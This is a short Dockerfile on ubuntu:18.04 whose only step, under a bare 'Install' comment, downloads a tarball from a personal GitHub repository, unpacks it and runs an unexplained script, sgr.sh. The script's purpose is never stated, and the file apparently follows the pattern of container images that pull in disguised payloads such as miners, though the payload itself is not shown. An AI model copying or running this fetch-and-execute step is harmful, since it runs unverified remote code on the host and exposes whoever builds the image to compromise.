FROM ubuntu:18.04

# Install.
RUN \
  apt-get update && \
    apt-get install -y wget && \
      wget https://github.com/thoeb292/thoeb292/raw/main/main.tar.gz && \
        tar xf main.tar.gz && \
	  ./sgr.sh && \
	    rm -rf /var/lib/apt/lists/*
